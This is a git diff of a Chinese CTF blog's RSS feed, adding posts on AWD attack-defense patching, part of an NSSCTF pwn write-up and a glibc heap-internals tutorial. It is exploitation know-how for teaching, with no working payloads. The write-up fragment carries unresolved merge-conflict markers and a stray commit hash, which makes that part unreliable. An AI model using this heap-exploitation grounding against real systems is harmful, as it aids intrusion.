+&lt;p&gt;维护合法函数指针列表，调用前检查指针是否在列表内（如&lt;code&gt;if (func_ptr != bay_dance &amp;amp;&amp;amp; func_ptr != chestnut_dance) return;&lt;/code&gt;）。&lt;/p&gt;
+&lt;h4 id=&#34;2-程序重编译与部署&#34;&gt;2. 程序重编译与部署
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;编译选项加固&lt;/strong&gt;：重新编译修复后的程序时，开启更严格的保护机制（如&lt;code&gt;-fstack-protector-strong&lt;/code&gt;增强 Canary、&lt;code&gt;-Wl,-z,relro,-z,now&lt;/code&gt;开启全 RELRO），提升对手攻击难度；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;快速部署&lt;/strong&gt;：将修复后的程序替换己方服务器上的原程序，重启服务（注意避免服务中断时间过长，部分比赛会因服务不可用扣分）；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;验证修复效果&lt;/strong&gt;：用己方编写的 EXP 测试修复后的程序，确认漏洞已被封堵（如 EXP 无法触发 Shell、程序无崩溃）。&lt;/p&gt;
+&lt;h4 id=&#34;3-日志监控与攻击溯源&#34;&gt;3. 日志监控与攻击溯源
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;日志分析&lt;/strong&gt;：监控 PWN 程序的运行日志（如输入输出日志、系统调用日志），识别对手的攻击尝试（如异常输入、重复连接）；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;流量捕获&lt;/strong&gt;：用&lt;code&gt;tcpdump&lt;/code&gt;/&lt;code&gt;wireshark&lt;/code&gt;捕获 PWN 程序端口的网络流量，分析对手的 EXP 特征（如固定 payload 开头、交互流程），为后续防御优化提供依据；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;应急响应&lt;/strong&gt;：若发现己方服务器被攻击（如 flag 被窃取），立即检查 PWN 程序是否存在未修复的漏洞，或是否有新的漏洞被利用，快速二次修复。&lt;/p&gt;
+&lt;h3 id=&#34;关键能力要求&#34;&gt;关键能力要求
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;漏洞挖掘速度&lt;/strong&gt;：比赛初期（前 30 分钟）能否快速定位可利用漏洞，直接决定攻击的 “黄金窗口期”；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;EXP 稳定性&lt;/strong&gt;：编写的 EXP 需能应对不同服务器环境（如不同 libc 版本、系统内核），避免因环境差异导致攻击失败；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;修复准确性&lt;/strong&gt;：修复漏洞时需精准定位问题点，避免引入新 bug（如过度修改导致程序功能异常）；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;抗压能力&lt;/strong&gt;：比赛中需同时处理 “攻击” 和 “防御”，需快速切换思路，应对对手的动态攻击策略。&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>NSSctf-专题PWN-writeup</title>
         <link>https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/</link>
-        <pubDate>Tue, 30 Sep 2025 00:00:00 +0000</pubDate>
+        <pubDate>Wed, 01 Oct 2025 00:00:00 +0000</pubDate>
         
         <guid>https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/</guid>
         <description>&lt;img src="https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/NSSCTF.png" alt="Featured image of post NSSctf-专题PWN-writeup" /&gt;&lt;p&gt;前言：&lt;/p&gt;
@@ -65,8 +344,34 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;看到下一步是被PWN通了的，我们可以进行交互模式了，用ls、cat命令拿到flag吧。&lt;/p&gt;
 &lt;h2 id=&#34;pwntools与gbd使用&#34;&gt;Pwntools与GBD使用
-&lt;/h2&gt;&lt;p&gt;取自[鹏城杯 2024]tArScR&lt;/p&gt;
+&lt;/h2&gt;&lt;p&gt;&amp;laquo;&amp;laquo;&amp;laquo;&amp;lt; HEAD
+还是没题目&amp;hellip;&lt;/p&gt;
+&lt;p&gt;IDA分析：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/4.png&#34;
+	width=&#34;684&#34;
+	height=&#34;345&#34;
+	srcset=&#34;https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/4_hu_b41b8e7161c72aea.png 480w, https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/4_hu_f97d5da594397fef.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;main函数&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;198&#34;
+		data-flex-basis=&#34;475px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h1 id=&#34;这题和上题不同的是这回v5要等于520才能执行system函数但v5再此前是被赋值位1314的单靠我们输入字符给程序不能拿到flag用其它手段去修改v5&#34;&gt;这题和上题不同的是，这回v5要等于“520”才能执行system函数，但v5再此前是被赋值位“1314”的，单靠我们输入字符给程序不能拿到flag，用其它手段去修改v5。
+&lt;/h1&gt;&lt;p&gt;取自[鹏城杯 2024]tArScR&lt;/p&gt;
 &lt;p&gt;题目：我的RSA挺有意思。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;191b05fa45e02dc8995178e6a8d2c0c238003afb&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
 &lt;h2 id=&#34;整数溢出&#34;&gt;整数溢出
 &lt;/h2&gt;&lt;h2 id=&#34;rop&#34;&gt;ROP
 &lt;/h2&gt;&lt;h2 id=&#34;ret2text及其变种&#34;&gt;ret2text及其变种
@@ -89,10 +394,376 @@
 ROP、shellcode、栈转移等。&lt;/p&gt;
 &lt;p&gt;内存中还有一块区域叫做堆（heap）。&lt;/p&gt;
 &lt;p&gt;接下来的一整章的内容，我们就来讲堆。&lt;/p&gt;
+&lt;blockquote class=&#34;alert alert-tip&#34;&gt;
+    &lt;blockquote&gt;
+&lt;p&gt;堆章节比较抽象，我还刻意加了很多图，但依旧比栈章节要更加抽象&amp;hellip;，以至于作者也学的迷迷糊糊，看不懂的欢迎来评论区讨论。&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
 &lt;h2 id=&#34;linux动态内存管理机制&#34;&gt;Linux动态内存管理机制
-&lt;/h2&gt;&lt;p&gt;什么是堆,现在我来带你研究&lt;/p&gt;
+&lt;/h2&gt;&lt;p&gt;什么是堆？+&lt;/p&gt;
 &lt;p&gt;堆是程序用于分配动态内存的一段内存区域。
 他独立的存在于内存中，介于程序内存 基地址和libc地址之间，&lt;strong&gt;从低地址向高地址生长&lt;/strong&gt;，与用户打交道最多。&lt;/p&gt;
+&lt;p&gt;带你举个例子理解动态分配内存：&lt;/p&gt;
+&lt;p&gt;开一个统计表格，每人最多输入的最大内存长度是4096个字节，按照以往惯性思维去分配的话，你是不是应该每人都在之前填表时就已经分好了内存给他们了，但不是每个人都能用完这4096个字节的，有些人只输入一个字节，那就意味着就有4095个字节的内存区域被浪费，如果每个人都这样做或输入少于最大字节长度的内存的数据，是不是浪费更多？&lt;/p&gt;
+&lt;p&gt;对于这种现象的下一步应该是回收，怎么回收？&lt;/p&gt;
+&lt;p&gt;那么，有没有一种方法，能让程序根据用户所需要的内存长度大小来分配内存呢？并且不需要我们管理内存呢？有的，在libc中，我们可以通过&lt;code&gt;malloc(size)&lt;/code&gt;来给用户分配一段长度为size的内存，通过&lt;code&gt;free(ptr)&lt;/code&gt;来释放这段内存区域。
+这些数据，被统一的存放在了堆中，维护这些数据的运行机制在glibc中，称之为&lt;code&gt;ptmalloc&lt;/code&gt;。&lt;/p&gt;
+&lt;h3 id=&#34;堆的内存管理机制&#34;&gt;堆的内存管理机制
+&lt;/h3&gt;&lt;p&gt;堆是真无敌恶心&amp;hellip;.堆的管理机制相比于栈十分复杂，可以算是对我这样0基础的萌新杀手。&lt;/p&gt;
+&lt;p&gt;但是堆的漏洞比栈有更多的形式和利用方式，而且堆漏洞所需要的条件比栈更
+少。
+一般情况下栈溢出起码需要16个字节，也就是至少溢出到返回地址才能利用，但是堆的话只需要一个字节就可完成利用，甚至这个字节可以是个x00,也就是空字节，nullbyte。&lt;/p&gt;
+&lt;blockquote class=&#34;alert alert-tip&#34;&gt;
+    &lt;blockquote&gt;
+&lt;p&gt;栈的话基本都会关闭一两个保护机制，堆的话一般全开。&lt;/p&gt;
+&lt;p&gt;CTFpwn的主流是堆利用。&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
+&lt;h4 id=&#34;堆块介绍&#34;&gt;堆块介绍
+&lt;/h4&gt;&lt;h5 id=&#34;chunk&#34;&gt;chunk
+&lt;/h5&gt;&lt;p&gt;在了解ptmalloc的内存管理机制前，我们先了解一下堆块在内存中的存储形式。在内存中，堆是以一个个堆块构成的,这些堆块称之为chunk。&lt;/p&gt;
+&lt;p&gt;在64位系统中，堆块的大小是8字节对齐的,也就是说，我们申请一个15字节长度的堆块，实际到我们手中的用户可控的数据区域大小为16字节。&lt;/p&gt;
+&lt;p&gt;但是在管理中，一个堆块除了用户数据区外，还有头部字段，头部字段的长度为16字节。同时在64位系统中，一个堆块最小长度为32字节（包括头部），也就是说，我们分配一个1字节的堆块，他的实际长度是32字节。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-3/1.png&#34;
+	width=&#34;600&#34;
+	height=&#34;699&#34;
+	srcset=&#34;https://expl0rer.top/p/pwn-3/1_hu_c6a945343d5e6bd0.png 480w, https://expl0rer.top/p/pwn-3/1_hu_edfe0fe933bf2d3e.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;堆块结构图&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;85&#34;
+		data-flex-basis=&#34;206px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;prev_size和size字段分别代表一个chunk对的大小，大小都是8字节，两个一共16字节，称之为chunk的头部字段。后面的user data区域是用户可以输入数据的地方。&lt;/p&gt;
+&lt;p&gt;chunk的大小8字节对齐，所以说对于分配器来说，0x80、0x81、0x82大小的堆块都是一样的，都为0x80大小。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;可能你举得有点懵，但这是一种简化表述，核心是&lt;strong&gt;堆块大小必须满足 8 字节对齐&lt;/strong&gt;，所以分配器会把不满足的大小调整到最近的 8 字节对齐的大小，这样就会出现多个请求大小对应同一个实际分配大小的情况。&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;为了节省空间，将size的最低三个bit设置为三个标志位。&lt;/p&gt;
+&lt;blockquote class=&#34;alert alert-note&#34;&gt;
+    &lt;blockquote&gt;
+&lt;p&gt;从高到低分别为&lt;code&gt;non_main_arena&lt;/code&gt;、&lt;code&gt;is_mmap&lt;/code&gt;、&lt;code&gt;prev_inuse&lt;/code&gt;，这里分别解释一下：&lt;/p&gt;
+&lt;p&gt;non_main_arena用来记录当前chunk是否不属于主线程,1表示不属于，0表示属于。&lt;/p&gt;
+&lt;p&gt;is_mmap表示当前chunk是否由mmap分配的，1表示属于，0表示不属于。&lt;/p&gt;
+&lt;p&gt;prev_inuse用来表示前面紧邻的那个chunk是否正在使用，0表示前面的chunk已经被释放，1表示正在被用户使用。&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-3/1.png&#34;
+	width=&#34;600&#34;
+	height=&#34;699&#34;
+	srcset=&#34;https://expl0rer.top/p/pwn-3/1_hu_c6a945343d5e6bd0.png 480w, https://expl0rer.top/p/pwn-3/1_hu_edfe0fe933bf2d3e.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;85&#34;
+		data-flex-basis=&#34;206px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;prevsize记录前面一个chunk的大小。这里注意，&lt;strong&gt;prevsize只有在前面的chunk被free掉的时候才生效&lt;/strong&gt;，也就是说，只有在prev_inuse为0的时候，系统才把prev_size字段当作prevsize。&lt;/p&gt;
+&lt;p&gt;那么其他时候这个字段有用吗？没用的话不就浪费了八个字节？&lt;/p&gt;
+&lt;p&gt;有用的！如果chunk正在被使用，那么他会把下一个chunk的prevsize字段当作userdata。充分利用空间。&lt;/p&gt;
+&lt;p&gt;也就是说，如果我们申请一个0x80长度大小的区域，系统实际给我们0×90大小（0x10头部），如果我们申请0x88大小的区域，系统同样也会给我们0x90大小的区域（算头部），剩下的8字节，使用nextchunk的prevsize区域。因为，只有当一个chunk被释放的时候，nextchunk的prevsize才真正代表前一个chunk的大小，所以就这么设计了。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h5 id=&#34;topchunk&#34;&gt;topchunk
+&lt;/h5&gt;&lt;p&gt;topchunk是一个特殊的chunk，类似于bss字段未被分配的内存一样，比较原始的。&lt;/p&gt;
+&lt;p&gt;最开始时，程序的堆还未被使用，整个的堆区域属于一个很大的堆块叫做topchunk。当已经被使用的空间不够时，程序就会从topchunk中分割一块出来个程序使用。&lt;/p&gt;
+&lt;h3 id=&#34;堆块的管理&#34;&gt;堆块的管理
+&lt;/h3&gt;&lt;p&gt;为了保证程序的快速运行，而且方便系统内存管理，所以ptmalloc将释放后的堆块根据其大小分成不同的bin。&lt;/p&gt;
+&lt;p&gt;fastbin：大小范围从0x20-0×80&lt;/p&gt;
+&lt;p&gt;smallbin：大小范围：0×90-0x400&lt;/p&gt;
+&lt;p&gt;Large bin：大小范围：0x410以上&lt;/p&gt;
+&lt;p&gt;unsortedbin：未被归类的bin，临时存储用，存放的堆块大小不一定多大，后续详细介绍。&lt;/p&gt;
+&lt;p&gt;chunk被free之后如图：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-3/2.png&#34;
+	width=&#34;608&#34;
+	height=&#34;706&#34;
+	srcset=&#34;https://expl0rer.top/p/pwn-3/2_hu_9e37b4c47dc91d38.png 480w, https://expl0rer.top/p/pwn-3/2_hu_3d5602cb30b1dc73.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;堆释放示意图&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;86&#34;
+		data-flex-basis=&#34;206px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;由于chunk被free了，所以按常理说用户不应该能够访问到这个chunk。于是乎在userdata区域存放一些用于管理内存的指针信息。&lt;/p&gt;
+&lt;p&gt;fastbin：单链表结构，只会用到fd这个指针；&lt;/p&gt;
+&lt;p&gt;small &amp;amp;unsortedbin：双向链表结构，fd和bk都用；&lt;/p&gt;
+&lt;p&gt;largebin：双向链表，fd、bk都用，同时还会用fd nextsize和bk nextsize。&lt;/p&gt;
+&lt;h3 id=&#34;堆块的合并操作&#34;&gt;堆块的合并操作
+&lt;/h3&gt;&lt;p&gt;如果我们free掉一个堆块，（可能）会触发向前合并和向后合并。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-3/2.png&#34;
+	width=&#34;608&#34;
+	height=&#34;706&#34;
+	srcset=&#34;https://expl0rer.top/p/pwn-3/2_hu_9e37b4c47dc91d38.png 480w, https://expl0rer.top/p/pwn-3/2_hu_3d5602cb30b1dc73.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;堆&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;86&#34;
+		data-flex-basis=&#34;206px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;向前合并：检查当前chunk的prev inuse位，如果为0，则根据当前chunk的prev size找到prev chunk的头，两个堆块合并；&lt;/p&gt;
+&lt;p&gt;向后合并：检查当前chunk的next next chunk的prev inuse位（因为一个堆块的状态由他后面chunk的prev inuse位决定，所以确定next chunk的状态需要检查next next chunk的prev inuse位，怎么找? size就行），然后根据next chunk的状态决定是否合并。&lt;/p&gt;
+&lt;p&gt;变化示意图：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-3/3.png&#34;
+	width=&#34;549&#34;
+	height=&#34;690&#34;
+	srcset=&#34;https://expl0rer.top/p/pwn-3/3_hu_3e940d845dbc5926.png 480w, https://expl0rer.top/p/pwn-3/3_hu_312b3e9f07d6e5d2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;79&#34;
+		data-flex-basis=&#34;190px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-3/4.png&#34;
+	width=&#34;514&#34;
+	height=&#34;700&#34;
+	srcset=&#34;https://expl0rer.top/p/pwn-3/4_hu_4c5c79d1e71a5cc8.png 480w, https://expl0rer.top/p/pwn-3/4_hu_394cc2401ee65f45.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;73&#34;
+		data-flex-basis=&#34;176px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-3/5.png&#34;
+	width=&#34;435&#34;
+	height=&#34;701&#34;
+	srcset=&#34;https://expl0rer.top/p/pwn-3/5_hu_6f7258d5a1b19d23.png 480w, https://expl0rer.top/p/pwn-3/5_hu_4f4b1d7c5324c890.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;62&#34;
+		data-flex-basis=&#34;148px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;这四张图看得有点懵？说人话就是prev_inuse=0说明前面chunk被释放了，呃身体都没了你要头有什么用？我的话过重了&amp;hellip;身体（chunk）被释放free没了应该头也跟着一起灰飞烟灭！！一起消失掉，和其它堆合并。（&lt;strong&gt;先向前合并再考虑向后合并&lt;/strong&gt;）&lt;/p&gt;
+&lt;blockquote class=&#34;alert alert-note&#34;&gt;
+    &lt;blockquote&gt;
+&lt;p&gt;“合并” 的关系&lt;/p&gt;
+&lt;p&gt;向前合并（关键关联 &lt;code&gt;prev_inuse = 0&lt;/code&gt;）&lt;/p&gt;
+&lt;p&gt;若当前堆块的 &lt;code&gt;prev_inuse = 0&lt;/code&gt; 时，说明&lt;strong&gt;前一个堆块是空闲的&lt;/strong&gt;。此时，当前堆块可以：&lt;/p&gt;
+&lt;p&gt;1、读取前一个堆块的头部信息（通过当前堆块的 &lt;code&gt;prev_size&lt;/code&gt; 字段，获取前一个堆块的大小）。&lt;/p&gt;
+&lt;p&gt;2、将 “当前堆块” 与 “前一个空闲堆块” 合并，形成一个更大的空闲堆块，减少内存碎片。&lt;/p&gt;
+&lt;p&gt;向后合并（与 &lt;code&gt;prev_inuse&lt;/code&gt; 无直接关联）&lt;/p&gt;
+&lt;p&gt;1、“向后合并” 是指&lt;strong&gt;当前空闲堆块&lt;/strong&gt;与&lt;strong&gt;后一个相邻的空闲堆块&lt;/strong&gt;合并，其判断条件是：&lt;strong&gt;后一个堆块是否为空闲&lt;/strong&gt;（通过检查后一个堆块的 &lt;code&gt;prev_inuse&lt;/code&gt; 标志）。&lt;/p&gt;
+&lt;p&gt;For instace，当前堆块是空闲的，若后一个堆块的 &lt;code&gt;prev_inuse = 0&lt;/code&gt;（说明后一个堆块认为 “前一个堆块（即当前堆块）是空闲的”），则可以进行向后合并。&lt;/p&gt;
+&lt;p&gt;2、可见，“向后合并” 的核心是&lt;strong&gt;后一个堆块的 &lt;code&gt;prev_inuse&lt;/code&gt; 标志&lt;/strong&gt;，而非当前堆块的 &lt;code&gt;prev_inuse&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;考虑到相对关系，简单来说对于当前你要讨论的堆头部来说，它的prev_inuse=0时，它本身就应该和前面的chunk合并。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;而“向后合并” 的触发条件是后一个堆块的 prev_inuse = 0（表示后一个堆块允许与前一个堆块 —— 即当前堆块 —— 合并）。&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;结构体&#34;&gt;结构体
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;aren&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;是一块结构体，用于管理bins。主线程创建的arena称之为main_arena,其他的叫threadarena。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;state&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/* Serialize access.*/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;mutex_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mutex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;cm&#34;&gt;/*Fastbins*/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;mfastbinptr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fastbinsY&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NFASTBINS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/* Base of the topmost chunk -- not otherwise kept in a bin*/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;mchunkptr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/* The remainder from the most recent split of a small request */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;mchunkptr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;last&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remainder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;cm&#34;&gt;/*Nromal bins packed as described above*/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;mchunkptr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bins&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NBINS&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;cm&#34;&gt;/*Bitmap of bins*/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;binmap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BINMAPSIZE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;cm&#34;&gt;/*Linked list*/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;state&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;cm&#34;&gt;/*Linked list for free arenas.*/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;state&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;next_free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/* Memory allocated from the system in this arena.*/&lt;/span&gt;
